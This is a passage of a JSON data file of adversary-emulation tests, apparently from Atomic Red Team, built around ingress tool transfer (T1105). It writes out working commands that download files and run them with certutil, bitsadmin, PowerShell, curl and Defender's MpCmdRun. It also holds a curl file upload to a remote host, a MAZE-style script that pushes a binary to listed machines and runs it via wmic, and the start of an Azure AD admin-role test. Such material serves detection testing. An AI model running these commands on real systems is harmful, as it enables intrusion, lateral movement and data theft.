				"description": "User account to authenticate on remote host",
				"type": "string",
				"default": "adversary"
			}
		},
		"executor": {
			"command": "sftp #{username}@#{remote_host}:#{remote_file} #{local_path}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "certutil download (urlcache)",
		"auto_generated_guid": "dd3b61dd-7bbc-48cd-ab51-49ad1a776df0",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_file": {
				"description": "URL of file to copy",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
			},
			"local_path": {
				"description": "Local path to place file",
				"type": "path",
				"default": "Atomic-license.txt"
			}
		},
		"executor": {
			"command": "cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}\n",
			"cleanup_command": "del #{local_path} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "certutil download (verifyctl)",
		"auto_generated_guid": "ffd492e3-0455-4518-9fb1-46527c9f241b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_file": {
				"description": "URL of file to copy",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
			},
			"local_path": {
				"description": "Local path to place file",
				"type": "path",
				"default": "Atomic-license.txt"
			}
		},
		"executor": {
			"command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }\n",
			"cleanup_command": "Remove-Item \"certutil-$(Get-Date -format yyyy_MM_dd)\" -Force -Recurse -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Windows - BITSAdmin BITS Download",
		"auto_generated_guid": "a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"bits_job_name": {
				"description": "Name of the created BITS job",
				"type": "string",
				"default": "qcxjb7"
			},
			"local_path": {
				"description": "Local path to place file",
				"type": "path",
				"default": "%temp%\\Atomic-license.txt"
			},
			"remote_file": {
				"description": "URL of file to copy",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
			}
		},
		"executor": {
			"command": "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Windows - PowerShell Download",
		"auto_generated_guid": "42dc4460-9aa6-45d3-b1a6-3955d34e1fe8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_file": {
				"description": "URL of file to copy",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
			},
			"destination_path": {
				"description": "Destination path to file",
				"type": "path",
				"default": "$env:TEMP\\Atomic-license.txt"
			}
		},
		"executor": {
			"command": "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"#{destination_path}\")\n",
			"cleanup_command": "Remove-Item #{destination_path} -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "OSTAP Worming Activity",
		"auto_generated_guid": "2ca61766-b456-4fcf-a35a-1233685e1cad",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"destination_path": {
				"description": "Path to create remote file at. Default is local admin share.",
				"type": "string",
				"default": "\\\\localhost\\C$"
			}
		},
		"executor": {
			"command": "pushd #{destination_path}\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js\nCScript.exe AtomicTestT1105.js //E:JScript\ndel AtomicTestT1105.js /Q >nul 2>&1\ndel AtomicTestFileT1105.js /Q >nul 2>&1\npopd\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "svchost writing a file to a UNC path",
		"auto_generated_guid": "fa5a2759-41d7-4e13-a19c-e8f28a53566f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt\n",
			"cleanup_command": "del C:\\T1105.txt >nul 2>&1\ndel C:\\\\svchost.exe >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Download a File with Windows Defender MpCmdRun.exe",
		"auto_generated_guid": "815bef8b-bf91-4b67-be4c-abe4c2a94ccc",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_file": {
				"description": "URL of file to download",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
			},
			"local_path": {
				"description": "Location to save downloaded file",
				"type": "path",
				"default": "%temp%\\Atomic-license.txt"
			}
		},
		"dependencies": [
			{
				"description": "Must have a Windows Defender version with MpCmdRun.exe installed",
				"prereq_command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe /?  >nul 2>&1\n",
				"get_prereq_command": "Echo \"A version of Windows Defender with MpCmdRun.exe must be installed manually\""
			}
		],
		"executor": {
			"command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}\n",
			"cleanup_command": "del #{local_path} >nul 2>&1\ndel %temp%\\MpCmdRun.log >nul 2>&1",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "whois file download",
		"auto_generated_guid": "c99a829f-0bb8-4187-b2c6-d47d1df74cab",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"remote_host": {
				"description": "Remote hostname or IP address",
				"type": "string",
				"default": "localhost"
			},
			"remote_port": {
				"description": "Remote port to connect to",
				"type": "integer",
				"default": 8443
			},
			"output_file": {
				"description": "Path of file to save output to",
				"type": "path",
				"default": "/tmp/T1105.whois.out"
			},
			"query": {
				"description": "Query to send to remote server",
				"type": "string",
				"default": "Hello from Atomic Red Team test T1105"
			},
			"timeout": {
				"description": "Timeout period before ending process (seconds)",
				"type": "integer",
				"default": 1
			}
		},
		"dependencies": [
			{
				"description": "The whois and timeout commands must be present\n",
				"prereq_command": "which whois && which timeout\n",
				"get_prereq_command": "echo \"Please install timeout and the whois package\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} \"#{query}\" > #{output_file}\n",
			"cleanup_command": "rm -f #{output_file}\n"
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "File Download via PowerShell",
		"auto_generated_guid": "54a4daf1-71df-4383-9ba7-f1a295d8b6d2",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"target_remote_file": {
				"description": "File to download",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt"
			},
			"output_file": {
				"description": "File to write to",
				"type": "string",
				"default": "LICENSE.txt"
			}
		},
		"executor": {
			"command": "(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "File download with finger.exe on Windows",
		"auto_generated_guid": "5f507e45-8411-4f99-84e7-e38530c45d01",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_host": {
				"description": "Remote hostname or IP address",
				"type": "string",
				"default": "localhost"
			}
		},
		"executor": {
			"name": "command_prompt",
			"command": "finger base64_filedata@#{remote_host}\n",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Download a file with IMEWDBLD.exe",
		"auto_generated_guid": "1a02df58-09af-4064-a765-0babe1a0d1e2",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_url": {
				"description": "Location of file to be downloaded.",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml"
			},
			"file_name": {
				"description": "Name of the file to be downloaded without extension.",
				"type": "string",
				"default": "T1105"
			}
		},
		"executor": {
			"command": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"\n& $imewdbled #{remote_url}\n",
			"cleanup_command": "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\" \n$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)\nif(\"\" -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction Ignore }\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Curl Download File",
		"auto_generated_guid": "2b080b99-0deb-4d51-af0f-833d37c4ca6a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_download": {
				"description": "File to download",
				"type": "string",
				"default": "https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll"
			},
			"curl_path": {
				"description": "path to curl.exe",
				"type": "path",
				"default": "C:\\Windows\\System32\\Curl.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Curl must be installed on system.\n",
				"prereq_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest \"https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-7.79.1-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\n"
			}
		],
		"executor": {
			"command": "#{curl_path} -k #{file_download} -o c:\\users\\public\\music\\allthethingsx64.dll\n#{curl_path} -k #{file_download} --output c:\\users\\public\\music\\allthethingsx64.dll\n#{curl_path} -k #{file_download} -o c:\\programdata\\allthethingsx64.dll\n#{curl_path} -k #{file_download} -o %Temp%\\allthethingsx64.dll\n",
			"cleanup_command": "del c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1\ndel c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1\ndel c:\\programdata\\allthethingsx64.dll >nul 2>&1\ndel %Temp%\\allthethingsx64.dll >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Curl Upload File",
		"auto_generated_guid": "635c9a38-6cbf-47dc-8615-3810bc1167cf",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"curl_path": {
				"description": "path to curl.exe",
				"type": "path",
				"default": "C:\\Windows\\System32\\Curl.exe"
			},
			"remote_destination": {
				"description": "Remote destination",
				"type": "string",
				"default": "www.example.com"
			},
			"file_path": {
				"description": "File to upload",
				"type": "string",
				"default": "c:\\temp\\atomictestfile.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Curl must be installed on system.\n",
				"prereq_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest \"https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip\" -Outfile PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-7.79.1-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\n"
			},
			{
				"description": "A file must be created to upload\n",
				"prereq_command": "if (Test-Path #{file_path}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "echo \"This is an Atomic Test File\" > #{file_path}\n"
			}
		],
		"executor": {
			"command": "#{curl_path} -T #{file_path} #{remote_destination}\n#{curl_path} --upload-file #{file_path} #{remote_destination}\n#{curl_path} -d #{file_path} #{remote_destination}\n#{curl_path} --data #{file_path} #{remote_destination}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Download a file with Microsoft Connection Manager Auto-Download",
		"auto_generated_guid": "d239772b-88e2-4a2e-8473-897503401bcc",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"Path_to_file": {
				"description": "Path to the Batch script",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1105\\src\\T1105.bat"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "#{Path_to_file} must exist on system.\n",
				"prereq_command": "if (Test-Path \"#{Path_to_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{Path_to_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.bat\" -OutFile \"#{Path_to_file}\"\n"
			}
		],
		"executor": {
			"command": "\"#{Path_to_file}\" 1>NUL \n",
			"cleanup_command": "del /f/s/q %temp%\\T1105 >nul 2>&1\nrmdir /s/q %temp%\\T1105 >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "MAZE Propagation Script",
		"auto_generated_guid": "70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"binary_file": {
				"description": "Binary file to copy to remote machines",
				"type": "string",
				"default": "$env:comspec"
			},
			"exe_remote_folder": {
				"description": "Path to store executable on remote machine (no drive letter)",
				"type": "string",
				"default": "\\Windows\\Temp\\T1105.exe"
			},
			"remote_drive_letter": {
				"description": "Remote drive letter",
				"type": "string",
				"default": "C"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Binary file must exist at specified location (#{binary_file})\n",
				"prereq_command": "if (Test-Path #{binary_file}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "write-host \"The binary_file input parameter must be set to a binary that exists on this computer.\"\n"
			},
			{
				"description": "Machine list must exist at specified location (\"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\")\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nnew-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\" | Out-Null\necho \"A machine list file has been generated at \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\". Please enter the machines to target there, one machine per line.\"\n"
			}
		],
		"executor": {
			"command": "$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"\n$offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"\n$completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"\nforeach ($machine in get-content -path \"$machine_list\")\n{if (test-connection -Count 1 -computername $machine -quiet) \n{cmd /c copy \"#{binary_file}\" \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\"\necho $machine >> \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}\"}\nelse\n{echo $machine >> \"$offline_list\"}}\n",
			"cleanup_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\") \n{foreach ($machine in get-content -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\")\n{wmic /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate | out-null\nRemove-Item -path \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\" -force -erroraction silentlycontinue}}\nRemove-Item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\" -erroraction silentlycontinue\nRemove-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\" -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Printer Migration Command-Line Tool UNC share folder into a zip file",
		"auto_generated_guid": "49845fc1-7961-4590-a0f0-3dbcf065ae7e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"Path_unc": {
				"description": "Path to the UNC folder",
				"type": "path",
				"default": "\\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\"
			},
			"Path_PrintBrm": {
				"description": "Path to PrintBrm.exe",
				"type": "path",
				"default": "C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe"
			}
		},
		"executor": {
			"command": "del %TEMP%\\PrintBrm.zip >nul 2>&1 \n#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\\PrintBrm.zip -O FORCE\n",
			"cleanup_command": "del %TEMP%\\PrintBrm.zip >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Lolbas replace.exe use to copy file",
		"auto_generated_guid": "54782d65-12f0-47a5-b4c1-b70ee23de6df",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"replace_cab": {
				"description": "Path to the cab file",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1105\\src\\redcanary.cab"
			},
			"Path_replace": {
				"description": "Path to replace.exe",
				"type": "path",
				"default": "C:\\Windows\\System32\\replace.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "#{replace_cab} must exist on system.\n",
				"prereq_command": "if (Test-Path \"#{replace_cab}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{replace_cab}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/redcanary.cab\" -OutFile \"#{replace_cab}\"\n"
			}
		],
		"executor": {
			"command": "del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} \"#{replace_cab}\" %TEMP% /A\n",
			"cleanup_command": "del %TEMP%\\redcanary.cab >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Lolbas replace.exe use to copy UNC file",
		"auto_generated_guid": "ed0335ac-0354-400c-8148-f6151d20035a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"replace_cab": {
				"description": "UNC Path to the cab file",
				"type": "path",
				"default": "\\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\redcanary.cab"
			},
			"Path_replace": {
				"description": "Path to replace.exe",
				"type": "path",
				"default": "C:\\Windows\\System32\\replace.exe"
			}
		},
		"executor": {
			"command": "del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} #{replace_cab} %TEMP% /A\n",
			"cleanup_command": "del %TEMP%\\redcanary.cab >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "certreq download",
		"auto_generated_guid": "6fdaae87-c05b-42f8-842e-991a74e8376b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"local_path": {
				"description": "Local path to place file",
				"type": "string",
				"default": "%temp%\\Atomic-license.txt"
			},
			"remote_file": {
				"description": "URL of file to copy",
				"type": "url",
				"default": "https://example.com"
			}
		},
		"executor": {
			"command": "certreq.exe -Post -config #{remote_file} c:\\windows\\win.ini #{local_path}",
			"cleanup_command": "del #{local_path} >nul 2>&1",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Download a file using wscript",
		"auto_generated_guid": "97116a3f-efac-4b26-8336-b9cb18c45188",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vbscript_file": {
				"description": "Full path to the VisualBasic downloading the file",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1105\\src\\T1105-download-file.vbs"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "#{vbscript_file} must be exist on system.\n",
				"prereq_command": "if (Test-Path \"#{vbscript_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{vbscript_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105-download-file.vbs\" -OutFile \"#{vbscript_file}\"\n"
			}
		],
		"executor": {
			"command": "wscript.exe \"#{vbscript_file}\"\n",
			"cleanup_command": "del Atomic-License.txt >nul 2>&1",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Linux Download File and Run",
		"auto_generated_guid": "bdc373c5-e9cf-4563-8a7b-a9ba720a90f3",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"remote_url": {
				"description": "url of remote payload",
				"type": "string",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh"
			},
			"payload_name": {
				"description": "payload name",
				"type": "string",
				"default": "atomic.sh"
			}
		},
		"executor": {
			"command": "curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}\n",
			"cleanup_command": "rm #{payload_name}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Nimgrab - Transfer Files",
		"auto_generated_guid": "b1729c57-9384-4d1c-9b99-9b220afb384e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_file": {
				"description": "URL of file to copy",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
			},
			"destination_path": {
				"description": "Destination path to file",
				"type": "path",
				"default": "$env:TEMP\\Atomic-license.txt"
			}
		},
		"executor": {
			"command": "cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\" #{remote_file} #{destination_path}\n",
			"cleanup_command": "del #{destination_path} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "NimGrab must be installed on system.\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://nim-lang.org/download/nim-1.6.6_x64.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim\\nim-1.6.6\\bin\\nimgrab.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\"\n"
			}
		],
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "iwr or Invoke Web-Request download",
		"auto_generated_guid": "c01cad7f-7a4c-49df-985e-b190dcf6a279",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_file": {
				"description": "URL of file to copy",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
			},
			"local_path": {
				"description": "Local path to place file",
				"type": "path",
				"default": "%temp%\\Atomic-license.txt"
			}
		},
		"executor": {
			"command": "powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}\n",
			"cleanup_command": "del %temp%\\Atomic-license.txt >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Arbitrary file download using the Notepad++ GUP.exe binary",
		"auto_generated_guid": "66ee226e-64cb-4dae-80e3-5bf5763e4a51",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"target_file_url": {
				"description": "URL of the target ZIP file (Eg: https://example.com/test.zip)",
				"type": "url",
				"default": "https://getsamplefiles.com/download/zip/sample-2.zip"
			},
			"working_dir": {
				"description": "The directory where GUP.exe & it's dependecies exists",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1105\\bin\\"
			},
			"gup_executable": {
				"description": "GUP is an open source signed binary used by Notepad++ for software updates",
				"type": "String",
				"default": "PathToAtomicsFolder\\T1105\\bin\\GUP.exe"
			},
			"target_file_sha256": {
				"description": "SHA256 value of target ZIP file",
				"type": "string",
				"default": "CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Gup.exe binary must exist on disk at specified location (#{gup_executable})",
				"prereq_command": "if (Test-Path \"#{gup_executable}\") {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{gup_executable}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/bin/GUP.exe\" -OutFile \"#{gup_executable}\""
			}
		],
		"executor": {
			"command": "mkdir \"c:\\Temp\"\ncd #{working_dir}\nGUP.exe -unzipTo \"\" \"C:\\Temp\" \"Sample #{target_file_url} #{target_file_sha256}\"",
			"cleanup_command": "rmdir /s /q \"C:\\Temp\\Sample\" >nul 2>nul",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "File download via nscurl",
		"auto_generated_guid": "5bcefe5f-3f30-4f1c-a61a-8d7db3f4450c",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"remote_file": {
				"description": "URL of remote file to download",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
			},
			"destination_path": {
				"description": "Local path to place remote file",
				"type": "path",
				"default": "license.txt"
			}
		},
		"executor": {
			"command": "nscurl -k \"#{remote_file}\" -o \"#{destination_path}\"",
			"cleanup_command": "rm \"#{destination_path}\"",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "File Download with Sqlcmd.exe",
		"auto_generated_guid": "6934c16e-0b3a-4e7f-ab8c-c414acd32181",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_url": {
				"description": "URL of the C2 Server from where file/s need to be downloaded",
				"type": "url",
				"default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip"
			},
			"local_file_path": {
				"description": "The local file path along with filename to where the file needs to be downloaded and placed.",
				"type": "path",
				"default": "C:\\T1105.zip"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Windows package 'Sqlcmd' need to be available in the machine to execute this atomic successfully",
				"prereq_command": "if (Get-Command sqlcmd 2>$null) {exit 0} else {exit 1}",
				"get_prereq_command": "winget install Microsoft.Sqlcmd --silent 2>$null | Out-Null"
			}
		],
		"executor": {
			"command": "sqlcmd -i #{remote_url} -o #{local_file_path}",
			"cleanup_command": "rm \"#{local_file_path}\" 2>$null | Out-Null",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "Azure AD - Add Company Administrator Role to a user",
		"auto_generated_guid": "4d77f913-56f5-4a14-b4b1-bf7bb24298ad",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"username": {
				"description": "Azure AD username",
				"type": "string",
				"default": "jonh@contoso.com"
			},
			"password": {
				"description": "Azure AD password",
				"type": "string",
				"default": "p4sswd"
			},
			"target_user": {
				"description": "Name of the user who will be assigned the Company Admin role",
				"type": "string",
				"default": "default"
			}
		},
		"dependency_executor_name": "powershell",
